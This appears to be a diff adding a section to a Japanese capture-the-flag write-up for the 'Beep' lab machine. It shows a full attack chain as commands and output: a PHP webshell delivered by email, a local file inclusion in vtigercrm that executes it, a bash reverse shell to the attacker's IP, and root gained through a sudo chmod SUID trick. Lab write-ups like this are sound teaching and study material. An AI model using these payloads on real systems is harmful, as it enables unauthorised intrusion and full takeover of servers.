@@ -672,3 +672,126 @@ bash: no job control in this shell
 [root@beep webmin]# id
 uid=0(root) gid=0(root)
 ```
+
+
+## PATH 4
+path2で、LFIを確認した  
+smtpでメール本文内にphpのwebshellを埋め込み・送付
+```sh
+└─$ swaks --to asterisk@localhost --from kali@localhost --header "Subject: test shell" --body 'check out this code: <?php system($_REQUEST["cmd"]); ?>' --server 10.129.205.98
+=== Trying 10.129.205.98:25...
+=== Connected to 10.129.205.98.
+<-  220 beep.localdomain ESMTP Postfix
+ -> EHLO kali
+<-  250-beep.localdomain
+<-  250-PIPELINING
+<-  250-SIZE 10240000
+<-  250-VRFY
+<-  250-ETRN
+<-  250-ENHANCEDSTATUSCODES
+<-  250-8BITMIME
+<-  250 DSN
+ -> MAIL FROM:<kali@localhost>
+<-  250 2.1.0 Ok
+ -> RCPT TO:<asterisk@localhost>
+<-  250 2.1.5 Ok
+ -> DATA
+<-  354 End data with <CR><LF>.<CR><LF>
+ -> Date: Fri, 27 Jun 2025 21:48:31 -0400
+ -> To: asterisk@localhost
+ -> From: kali@localhost
+ -> Subject: test shell
+ -> Message-Id: <20250627214831.570096@kali>
+ -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+ -> 
+ -> check out this code: <?php system($_REQUEST["cmd"]); ?>
+ -> 
+ -> 
+ -> .
+<-  250 2.0.0 Ok: queued as E5F79C0003
+ -> QUIT
+<-  221 2.0.0 Bye
+=== Connection closed with remote host.
+```
+LFIでwebshellを実行できることが分かった
+```sh
+└─$ curl --insecure --tlsv1.0 "https://10.129.205.98/vtigercrm/graph.php?current_language=../../../../../../../..///var/mail/asterisk%00&module=Accounts&action&cmd=id" | grep 'From kali@localhost' -A 30
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 18434    0 18434    0     0  11360      0 --:--:--  0:00:01 --:--:-- 11357
+From kali@localhost.localdomain  Sat Jun 28 04:48:53 2025
+Return-Path: <kali@localhost.localdomain>
+X-Original-To: asterisk@localhost
+Delivered-To: asterisk@localhost.localdomain
+Received: from kali (unknown [10.10.16.11])
+        by beep.localdomain (Postfix) with ESMTP id E5F79C0003
+        for <asterisk@localhost>; Sat, 28 Jun 2025 04:48:52 +0300 (EEST)
+Date: Fri, 27 Jun 2025 21:48:31 -0400
+To: asterisk@localhost
+From: kali@localhost
+Subject: test shell
+Message-Id: <20250627214831.570096@kali>
+X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+
+check out this code: uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
+
+
+
+Sorry! Attempt to access restricted file.
+```
+リバースシェル用のコマンド実行
+```sh
+└─$ urlencode "bash -i >& /dev/tcp/10.10.16.11/4444 0>&1"  
+bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.11%2F4444%200%3E%261
+
+
+└─$ curl --insecure --tlsv1.0 "https://10.129.205.98/vtigercrm/graph.php?current_language=../../../../../../../..///var/mail/asterisk%00&module=Accounts&action&cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.11%2F4444%200%3E%261"
+```
+リバースシェル取得！
+sudoでchmodを操作できるので、rootがユーザであるbashにSUIDを付与し、権限昇格成功！
+```sh
+└─$ rlwrap nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.11] from (UNKNOWN) [10.129.205.98] 49601
+bash: no job control in this shell
+bash-3.2$ id
+uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
+
+
+bash-3.2$ sudo -l
+Matching Defaults entries for asterisk on this host:
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
+    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY"
+
+User asterisk may run the following commands on this host:
+    (root) NOPASSWD: /sbin/shutdown
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/bin/yum
+    (root) NOPASSWD: /bin/touch
+    (root) NOPASSWD: /bin/chmod
+    (root) NOPASSWD: /bin/chown
+    (root) NOPASSWD: /sbin/service
+    (root) NOPASSWD: /sbin/init
+    (root) NOPASSWD: /usr/sbin/postmap
+    (root) NOPASSWD: /usr/sbin/postfix
+    (root) NOPASSWD: /usr/sbin/saslpasswd2
+    (root) NOPASSWD: /usr/sbin/hardware_detector
+    (root) NOPASSWD: /sbin/chkconfig
+    (root) NOPASSWD: /usr/sbin/elastix-helper
+
+
+bash-3.2$ cp /bin/bash /tmp/bash
+
+
+bash-3.2$ sudo chmod 4755 /bin/bash
+
+
+bash-3.2$ /bin/bash -p
+
+
+id
+uid=100(asterisk) gid=101(asterisk) euid=0(root) groups=101(asterisk)
+```
